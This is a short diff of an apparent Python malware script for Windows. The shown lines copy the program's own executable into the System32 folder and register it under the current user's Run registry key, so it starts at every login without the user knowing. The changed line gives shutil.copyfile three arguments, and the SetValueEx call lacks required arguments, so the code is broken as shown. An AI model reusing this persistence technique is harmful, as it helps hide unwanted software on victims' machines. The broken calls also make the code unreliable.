@@ -15,7 +15,7 @@ import winreg   # use to create startup process
 """registry things"""
 sys.executable = ""
 filename = f"{os.path.splitext(os.path.basename(__file__))[0]}.exe"   # .exe of the file
-shutil.copyfile(os.path.join(os.path.dirname(__file__), f"/{filename}"), f"C:\\Windows\\System32\\{filename}")
+shutil.copyfile(os.path.dirname(__file__), f"/{filename}", f"C:\\Windows\\System32\\{filename}")
 key = winreg.HKEY_CURRENT_USER
 runkey = winreg.OpenKeyEx(key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
 winreg.SetValueEx(runkey, f"C:\\Windows\\System32\\{filename}")
